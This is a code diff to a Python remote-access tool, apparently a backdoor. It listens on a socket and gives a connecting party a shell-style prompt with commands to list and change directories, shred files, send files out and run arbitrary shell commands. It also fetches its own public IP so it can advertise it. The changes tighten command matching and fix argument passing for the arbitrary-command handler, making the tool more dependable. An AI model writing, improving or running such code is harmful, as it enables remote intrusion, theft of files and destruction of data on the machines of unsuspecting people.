@@ -43,7 +43,6 @@ def send(connection_socket, target_file_path):
     connection_socket.close()
 
 
-
 def command(cmd):
     """Execute command and return process with its stdout and stderr."""
     proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -51,7 +50,7 @@ def command(cmd):
 
 
 def publish():
-    """Get IP address to create connection."""
+    """Get IP address."""
     r = urllib.request.urlopen('https://api.ipify.org')
     ip_address = r.read().decode()
     print(ip_address)
@@ -68,15 +67,15 @@ def main():
         conn.sendall(f"\n{cwd}:~$$$ ".encode())
         cmd = conn.recv(4096).decode()
 
-        if 'pwd' in cmd.lower():
+        if cmd.lower().rstrip() == "pwd":
             conn.sendall(pwd().encode())
             continue
 
-        elif 'whoami' in cmd.lower():
+        elif cmd.lower().rstrip() == "whoami":
             conn.sendall(whoami().encode())
             continue
 
-        elif 'ls' in cmd.lower():
+        elif cmd.lower().rstrip() == "ls":
             try:
                 for item in ls():
                     conn.sendall(f"{item}\n".encode())
@@ -85,7 +84,7 @@ def main():
                 conn.sendall(f"Could not list directory: {e}\n".encode())
                 continue
 
-        elif 'cd' in cmd.lower():
+        elif cmd.lower().rstrip().startswith('cd'): 
             split_command = cmd.split()
             new_directory = ' '.join(split_command[1:])
             try:
@@ -95,7 +94,7 @@ def main():
                 conn.sendall(f"Could not change directory: {e}\n".encode())
                 continue
 
-        elif 'shred' in cmd.lower():
+        elif cmd.lower().rstrip().startswith('shred'):
             split_command = cmd.split()
             item = split_command[1]
             try:
@@ -108,7 +107,7 @@ def main():
                 conn.sendall(f"Could not remove item: {e}".encode())
                 continue
 
-        elif 'send' in cmd.lower():
+        elif cmd.lower().rstrip().startswith('send'):
             split_command = cmd.split()
             file_path = ' '.join(split_command[1:])
             try:
@@ -121,9 +120,9 @@ def main():
                 conn.sendall(f"Could not send file: {e}".encode())
                 continue
 
-        elif 'command' in cmd.lower():
+        elif cmd.lower().rstrip().startswith('command'):
             split_command = cmd.split()
-            process = command(split_command[1])
+            process = command(' '.join(split_command[1:]))
             if process.stdout:
                 conn.sendall(process.stdout)
                 continue
@@ -131,7 +130,7 @@ def main():
                 conn.sendall(process.stderr)
                 continue
 
-        elif 'exitnow' in cmd.lower():
+        elif cmd.lower().rstrip() == "exitnow":
             conn.sendall(b">>>>> Closing connection.\n")
             conn.close()
             break
